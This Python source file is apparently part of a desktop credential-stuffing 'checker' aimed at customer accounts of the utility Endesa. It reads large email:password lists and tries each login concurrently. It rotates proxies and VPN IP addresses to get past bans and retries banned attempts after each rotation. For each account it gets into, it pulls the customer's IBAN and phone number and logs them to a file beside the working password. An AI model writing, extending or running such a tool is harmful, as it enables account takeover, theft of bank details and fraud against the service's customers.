#!/usr/bin/env python3
"""Thread for batch processing Endesa credentials."""

import os
import time
import logging
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, List, Tuple, Dict

from PyQt6.QtCore import QThread, pyqtSignal

from src.core.endesa import EndesaClient
from src.core.credentials_reader import CredentialsReader
from src.network.vpn_manager import VPNManager
from src.network.proxy_manager import ProxyManager
from src.core.retry_manager import SimpleRetryProcessor, VPNRetryQueue


class UILogHandler(logging.Handler):
    """Custom logging handler to route log messages to UI."""
    
    def __init__(self, signal_emitter):
        super().__init__()
        self.signal_emitter = signal_emitter
    
    def emit(self, record):
        try:
            log_entry = self.format(record)
            # Format message based on level and content
            if record.levelno >= logging.ERROR:
                message = f"LOGGIN_ERROR: {log_entry}"
            elif record.levelno >= logging.WARNING:
                # Only treat login/auth related warnings as failures, VPN status as info
                if record.name == 'VPN' or 'IP unchanged' in record.getMessage() or 'IP changed' in record.getMessage():
                    message = log_entry  # VPN status messages as plain text
                else:
                    message = f"LOGIN_FAILED: {log_entry}"  # Actual login warnings as failures
            else:
                message = log_entry  # Info messages as plain text
            
            self.signal_emitter.emit(message)
        except Exception:
            pass  # Prevent logging errors from crashing the app


class BatchProcessorThread(QThread):
    """Thread for running batch processing without blocking the UI."""
    
    progress_updated = pyqtSignal(str)
    status_updated = pyqtSignal(str)
    stats_updated = pyqtSignal(int, int, int, int, float)  # success, failed, banned, total, rate
    progress_percentage = pyqtSignal(int)  # Progress percentage
    finished_processing = pyqtSignal(int, int, float)
    vpn_status_updated = pyqtSignal(str)
    
    def __init__(self, credentials_file: str, max_workers: int, output_file: str, 
                 max_retries: int = 3, retry_delay: float = 2.0, use_vpn: bool = False):
        super().__init__()
        self.credentials_file = credentials_file
        self.max_workers = max_workers
        self.output_file = output_file
        self.max_retries = max_retries  # Keep for interface compatibility
        self.retry_delay = retry_delay  # Keep for interface compatibility
        self.use_vpn = use_vpn
        self.vpn_manager = None
        self.running = True
        self.start_time = None
        
        # Initialize proxy manager (will be set from main window if proxies are enabled)
        self.proxy_manager = None
        self.proxy_strategy = "round_robin"
        
        # Set up logging handler to capture Python logger messages
        self.log_handler = UILogHandler(self.progress_updated)
        self.log_handler.setLevel(logging.INFO)  # Capture info, warnings and errors
        self.log_handler.setFormatter(logging.Formatter('%(name)s - %(message)s'))
        
        # Add handler to root logger to capture all logger messages
        logging.getLogger().addHandler(self.log_handler)
        
    def run(self):
        """Run the batch processing without retry logic."""
        try:
            # Check if credentials file exists
            if not os.path.exists(self.credentials_file):
                self.status_updated.emit("Credentials file not found")
                return
            
            # Create credentials reader for memory-efficient processing
            credentials_reader = CredentialsReader(self.credentials_file, chunk_size=1000)
            
            # Get total count for progress tracking
            total_credentials = credentials_reader.get_total_count()
            
            if total_credentials == 0:
                self.status_updated.emit("No valid credentials found in file")
                return
            
            self.status_updated.emit(f"Processing {total_credentials} credentials with {self.max_workers} workers...")
            
            self.start_time = time.time()
            successful = 0
            failed = 0
            banned = 0
            
            # Initialize VPN if enabled
            if self.use_vpn:
                try:
                    self.vpn_manager = VPNManager()
                    self.progress_updated.emit("VPN initialized successfully")
                except Exception as e:
                    self.progress_updated.emit(f"VPN initialization failed: {e}")
                    self.use_vpn = False
            
            # Process credentials based on mode using chunked processing
            if self.use_vpn:
                successful, failed, banned = self._process_vpn_mode_chunked(credentials_reader, total_credentials)
            else:
                successful, failed, banned = self._process_normal_mode_chunked(credentials_reader, total_credentials)
            
            # Disconnect VPN if enabled
            if self.use_vpn and self.vpn_manager:
                try:
                    self.vpn_manager.disconnect()
                except Exception as e:
                    self.progress_updated.emit(f"VPN disconnect error: {e}")
            
            end_time = time.time()
            total_time = end_time - self.start_time
            
            self.finished_processing.emit(successful, failed, total_time)
            
        except Exception as e:
            self.status_updated.emit(f"Error: {str(e)}")
        finally:
            # Remove logging handler to prevent memory leaks
            if hasattr(self, 'log_handler'):
                logging.getLogger().removeHandler(self.log_handler)
    
    def _process_normal_mode_chunked(self, credentials_reader: CredentialsReader, total_credentials: int) -> Tuple[int, int, int]:
        """Process credentials in normal mode using chunked processing for memory efficiency."""
        self.progress_updated.emit("Starting normal mode processing...")
        
        successful = 0
        failed = 0
        banned = 0
        retry_processor = SimpleRetryProcessor(self._attempt_credential,max_retries=self.max_retries,retry_delay=self.retry_delay,progress_callback=self.progress_updated.emit)
        
        # Chunked normal mode processing
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            for chunk in credentials_reader.read_chunks():
                if not self.running:
                    break
                
                # Filter out invalid lines and emit SKIP messages for them
                valid_credentials = []
                for email, password, line_num in chunk:
                    if email == "INVALID_LINE":
                        # password contains the invalid line content, line_num is correct
                        self.progress_updated.emit(f"SKIP: Line {line_num} - Invalid format (missing ':')")
                        continue
                    valid_credentials.append((email, password, line_num))
                
                if not valid_credentials:
                    continue
                
                future_to_meta = {}
                for email, password, line_num in valid_credentials:
                    if not self.running:
                        break
                    future = executor.submit(retry_processor.process_with_retry, email, password, line_num)
                    future_to_meta[future] = (email, password, line_num)
                # Use as_completed to properly wait for ALL threads to finish
                from concurrent.futures import as_completed
                
                for future in as_completed(future_to_meta.keys()):
                    if not self.running:
                        # Stop processing if the thread is stopped
                        for fut in future_to_meta:
                            fut.cancel()
                        break
                    email, password, line_num = future_to_meta[future]
                    
                    try:
                        result, result_type = future.result(timeout=30)  # 30 second timeout per thread

                        
                        # Write successful results to file
                        if result.startswith("SUCCESS:") or result.startswith("NO_DATA:"):
                            self._write_result_to_file(result)
                        
                        # Emit the result message
                        self.progress_updated.emit(result)
                        
                        # Update statistics
                        if result_type == "SUCCESS":
                            successful += 1
                        elif result_type == "BANNED":
                            banned += 1
                        elif result_type == "NO_DATA":
                            successful += 1
                        else:  # FAILED
                            failed += 1
                        
                    except TimeoutError:
                        future.cancel()
                        failed += 1
                        self.progress_updated.emit(
                            f"ERROR: Line {line_num} - {email} - Timeout (>30 s)"
                        )

                    except Exception as exc:
                        failed += 1
                        self._write_result_to_file(
                            f"ERROR: Line {line_num} - {email} - {exc}"
                        )
                        self.progress_updated.emit(
                            f"ERROR: Line {line_num} - {email} - {exc}"
                        )

                    processed_total = successful + failed + banned
                    progress_percent = int((processed_total / total_credentials) * 100)
                    self.progress_percentage.emit(progress_percent)

                    elapsed = time.time() - self.start_time
                    rate = processed_total / elapsed if elapsed else 0
                    self.stats_updated.emit(
                        successful, failed, banned, processed_total, rate
                    )
                    self.status_updated.emit(
                        f"Processed: {processed_total}/{total_credentials} ({progress_percent}%)"
                    )

                if not self.running:
                    break  # Si hemos cancelado, salimos del bucle de chunks

        return successful, failed, banned
    


    def _process_vpn_mode_chunked(self, credentials_reader: CredentialsReader, total_credentials: int) -> Tuple[int, int, int]:
        """
        Process credentials in VPN mode using chunked processing, with deferred retries.
    
        Banned credentials are not immediately retried in the same batch. Instead, they
        are placed into a queue and only re‑processed after the next VPN rotation.
        """
        pending_retries: deque = deque()  # holds (email, password, line_num, retry_count)
        successful = 0
        failed = 0
        banned = 0
        batch_count = 0
    
        for chunk in credentials_reader.read_chunks():
            if not self.running:
                break
            
            # Collect new credentials from this chunk and assign retry_count = 0
            # Also emit a message for invalid lines
            remaining_credentials: List[Tuple[str, str, int, int]] = []
            for email, password, line_num in chunk:
                if email == "INVALID_LINE":
                    self.progress_updated.emit(f"SKIP: Line {line_num} - Invalid format (missing ':')")
                    continue
                remaining_credentials.append((email, password, line_num, 0))
    
            # If no new work and no retries, skip
            if not remaining_credentials and not pending_retries:
                continue
            
            # Process until we've exhausted new credentials and pending retries
            while (remaining_credentials or pending_retries) and self.running:
                current_batch: List[Tuple[str, str, int, int]] = []
    
                # Fill the batch with pending retries first
                while pending_retries and len(current_batch) < self.max_workers:
                    current_batch.append(pending_retries.popleft())
    
                # Then fill the rest of the batch with new credentials
                while remaining_credentials and len(current_batch) < self.max_workers:
                    current_batch.append(remaining_credentials.pop(0))
    
                if not current_batch:
                    break
                
                batch_count += 1
    
                # VPN connection and rotation logic
                if batch_count == 1:
                    self.progress_updated.emit("🔗 Connecting to VPN with proper verification…")
                    if self.vpn_manager.connect_with_proper_verification():
                        self.progress_updated.emit("✅ VPN connected and verified!")
                    else:
                        self.progress_updated.emit("❌ VPN connection failed, continuing without VPN")
                        self.use_vpn = False
                else:
                    self.progress_updated.emit("🔄 Rotating IP for next batch…")
                    if self.vpn_manager.rotate_ip():
                        self.progress_updated.emit("✅ IP rotated successfully")
                    else:
                        self.progress_updated.emit("⚠️ IP rotation failed, continuing with current IP")
    
                # Collect banned credentials from this batch to retry later
                next_retries: deque = deque()
    
                # Process the batch concurrently
                with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                    future_to_meta: Dict = {
                        executor.submit(self._attempt_credential, email, password, line_num): (email, password, line_num, retry_count)
                        for (email, password, line_num, retry_count) in current_batch
                    }
    
                    for future in as_completed(future_to_meta):
                        email, password, line_num, retry_count = future_to_meta[future]
                        try:
                            result, result_type = future.result(timeout=30)
                            # Write successful results to file
                            if result.startswith(("SUCCESS:", "NO_DATA:")):
                                self._write_result_to_file(result)
                            # Emit the result message
                            self.progress_updated.emit(result)
    
                            # Update counters and collect retries
                            if result_type in {"SUCCESS", "NO_DATA"}:
                                successful += 1
                            elif result_type == "BANNED":
                                if retry_count < self.max_retries:
                                    # Defer this banned credential to the next batch
                                    next_retries.append((email, password, line_num, retry_count + 1))
                                else:
                                    banned += 1
                            else:
                                failed += 1
    
                        except Exception as exc:
                            # Handle unexpected errors
                            failed += 1
                            err_msg = f"ERROR: Line {line_num} - {email} - {exc}"
                            self._write_result_to_file(err_msg)
                            self.progress_updated.emit(err_msg)
    
                # After processing this batch, set pending_retries to the newly banned ones
                pending_retries = next_retries
    
                # Update progress and stats
                current_total = successful + failed + banned
                progress_percent = int((current_total / total_credentials) * 100)
                self.progress_percentage.emit(progress_percent)
    
                elapsed_time = time.time() - self.start_time
                rate = current_total / elapsed_time if elapsed_time > 0 else 0.0
                self.stats_updated.emit(successful, failed, banned, current_total, rate)
                self.status_updated.emit(f"Processed: {current_total}/{total_credentials} ({progress_percent}%)")
    
        # If there are still retries left after all chunks, process them in additional batches
        while pending_retries and self.running:
            batch_count += 1
            self.progress_updated.emit("🔄 Rotating IP for next batch…")
            if self.vpn_manager.rotate_ip():
                self.progress_updated.emit("✅ IP rotated successfully")
            else:
                self.progress_updated.emit("⚠️ IP rotation failed, continuing with current IP")
    
            current_batch: List[Tuple[str, str, int, int]] = []
            while pending_retries and len(current_batch) < self.max_workers:
                current_batch.append(pending_retries.popleft())
    
            next_retries: deque = deque()
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                future_to_meta = {
                    executor.submit(self._attempt_credential, email, password, line_num): (email, password, line_num, retry_count)
                    for (email, password, line_num, retry_count) in current_batch
                }
                for future in as_completed(future_to_meta):
                    email, password, line_num, retry_count = future_to_meta[future]
                    try:
                        result, result_type = future.result(timeout=30)
                        if result.startswith(("SUCCESS:", "NO_DATA:")):
                            self._write_result_to_file(result)
                        self.progress_updated.emit(result)
                        if result_type in {"SUCCESS", "NO_DATA"}:
                            successful += 1
                        elif result_type == "BANNED":
                            if retry_count < self.max_retries:
                                next_retries.append((email, password, line_num, retry_count + 1))
                            else:
                                banned += 1
                        else:
                            failed += 1
                    except Exception as exc:
                        failed += 1
                        err_msg = f"ERROR: Line {line_num} - {email} - {exc}"
                        self._write_result_to_file(err_msg)
                        self.progress_updated.emit(err_msg)
    
            pending_retries = next_retries
    
            # Update progress for this extra batch
            current_total = successful + failed + banned
            progress_percent = int((current_total / total_credentials) * 100)
            self.progress_percentage.emit(progress_percent)
    
            elapsed_time = time.time() - self.start_time
            rate = current_total / elapsed_time if elapsed_time > 0 else 0.0
            self.stats_updated.emit(successful, failed, banned, current_total, rate)
            self.status_updated.emit(f"Processed: {current_total}/{total_credentials} ({progress_percent}%)")
    
        return successful, failed, banned
    

    
    def _process_batch_vpn(self, batch_credentials: List[Tuple[str, str, int]]) -> Tuple[int, int, int]:
        """Process a batch of credentials in VPN mode."""
        successful = 0
        failed = 0
        banned = 0
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # Submit all tasks
            future_to_credential = {}
            for email, password, line_num in batch_credentials:
                if not self.running:
                    break
                
                future = executor.submit(self._attempt_credential, email, password, line_num)
                future_to_credential[future] = (email, password, line_num)
            
            # Use as_completed to properly wait for ALL threads to finish
            from concurrent.futures import as_completed
            
            for future in as_completed(future_to_credential.keys()):
                if not self.running:
                    break
                
                try:
                    result, result_type = future.result(timeout=30)  # 30 second timeout per thread
                    email, password, line_num = future_to_credential[future]
                    
                    # Write successful results to file
                    if result.startswith("SUCCESS:") or result.startswith("NO_DATA:"):
                        self._write_result_to_file(result)
                    
                    # Emit the result message
                    self.progress_updated.emit(result)
                    
                    # Update batch statistics
                    if result_type == "SUCCESS":
                        successful += 1
                    elif result_type == "BANNED":
                        banned += 1
                    elif result_type == "NO_DATA":
                        successful += 1
                    else:  # FAILED
                        failed += 1
                    
                except Exception as e:
                    email, password, line_num = future_to_credential[future]
                    result = f"ERROR: Line {line_num} - {email} - {str(e)}"
                    self._write_result_to_file(result)
                    self.progress_updated.emit(result)
                    failed += 1
        
        return successful, failed, banned
    
    def _attempt_credential(self, email: str, password: str, line_num: int, proxy: Optional[str] = None) -> Tuple[str, str]:
        """Attempt to process a single credential."""
        current_proxy = proxy
        try:
            # Get proxy from proxy manager if not provided and available
            if not current_proxy and self.proxy_manager:
                if self.proxy_strategy == "random":
                    current_proxy = self.proxy_manager.get_random_proxy()
                elif self.proxy_strategy == "best_performance":
                    current_proxy = self.proxy_manager.get_best_proxy()
                else:  # round_robin
                    current_proxy = self.proxy_manager.get_next_proxy()
            
            # Normalize proxy format if needed
            normalized_proxy = None
            if current_proxy and self.proxy_manager:
                normalized_proxy = self.proxy_manager._normalize_proxy_for_requests(current_proxy)
            elif current_proxy:
                # Fallback normalization
                if '://' not in current_proxy:
                    if '@' in current_proxy:
                        normalized_proxy = f"http://{current_proxy}"
                    elif current_proxy.count(':') >= 3:
                        parts = current_proxy.split(':')
                        host, port = parts[0], parts[1]
                        auth = ':'.join(parts[2:])
                        normalized_proxy = f"http://{auth}@{host}:{port}"
                    elif current_proxy.count(':') == 1:
                        normalized_proxy = f"http://{current_proxy}"
                    else:
                        normalized_proxy = current_proxy
                else:
                    normalized_proxy = current_proxy
            
            # Create client
            client = EndesaClient(email, password, self.max_workers, normalized_proxy)
            
            try:
                # Step 1: Login
                client.login()
                login_successful = True
            except Exception as login_error:
                login_successful = False
                error_msg = str(login_error)
                
                # Mark proxy as failed if used
                if current_proxy and self.proxy_manager:
                    self.proxy_manager.mark_proxy_failed(current_proxy)
                
                # Check error types
                if "BANNED:" in error_msg:
                    result = f"BANNED: Line {line_num} - {email} - {error_msg}"
                    return result, "BANNED"
                elif "timeout" in error_msg.lower() or "timed out" in error_msg.lower():
                    result = f"TIMEOUT: Line {line_num} - {email} - {error_msg}"
                    return result, "TIMEOUT"
                elif "invalid url '/sites/satellite'" in error_msg.lower():
                    result = f"INVALID: Line {line_num} - {email} - Invalid URL Satellite"
                    return result, "INVALID"
                else:
                    result = f"LOGIN_FAILED: Line {line_num} - {email} - {error_msg}"
                    return result, "FAILED"
            
            # Step 2: Get account info if login successful
            if login_successful:
                try:
                    account_info = client.get_account_info()
                    
                    # Format result
                    iban = account_info.get('iban', 'N/A')
                    phone = account_info.get('phone', 'N/A')
                    result = f"SUCCESS: Line {line_num} - {email}:{password} - IBAN: {iban} Phone: {phone}"
                    
                    # Mark proxy as successful if used
                    if current_proxy and self.proxy_manager:
                        self.proxy_manager.mark_proxy_success(current_proxy)
                    
                    return result, "SUCCESS"
                    
                except Exception as data_error:
                    error_msg = str(data_error)
                    
                    # Mark proxy as failed if used
                    if current_proxy and self.proxy_manager:
                        self.proxy_manager.mark_proxy_failed(current_proxy)
                    
                    # Check error types
                    if "BANNED:" in error_msg:
                        result = f"BANNED: Line {line_num} - {email} - {error_msg}"
                        return result, "BANNED"
                    elif "no retrieve data" in error_msg.lower() or "data not found" in error_msg.lower():
                        result = f"NO_DATA: Line {line_num} - {email}:{password} - No data retrieved"
                        # Mark proxy as successful since we got a valid response
                        if current_proxy and self.proxy_manager:
                            self.proxy_manager.mark_proxy_success(current_proxy)
                        return result, "NO_DATA"
                    else:
                        result = f"ERROR: Line {line_num} - {email} - Data retrieval failed: {error_msg}"
                        return result, "FAILED"
                        
        except Exception as e:
            result = f"ERROR: Line {line_num} - {email} - {str(e)}"
            
            # Mark proxy as failed if used
            if current_proxy and self.proxy_manager:
                self.proxy_manager.mark_proxy_failed(current_proxy)
            
            return result, "FAILED"
        finally:
            # Always close the client
            if 'client' in locals():
                client.close()
    
    def _write_result_to_file(self, result: str):
        """Write a single result immediately to file."""
        try:
            with open(self.output_file, "a", encoding='utf-8') as f:
                f.write(result + "\n")
        except Exception as e:
            self.progress_updated.emit(f"ERROR: Failed to write to file - {str(e)}")
    
    def get_proxy_stats(self):
        """Get proxy statistics from the proxy manager."""
        if self.proxy_manager:
            return self.proxy_manager.get_proxy_stats()
        return {}
    
    def get_healthy_proxy_count(self):
        """Get the number of healthy proxies."""
        if self.proxy_manager:
            return self.proxy_manager.get_healthy_proxy_count()
        return 0
    
    def stop(self):
        """Stop the processing safely."""
        try:
            self.running = False
        except Exception as e:
            self.running = False 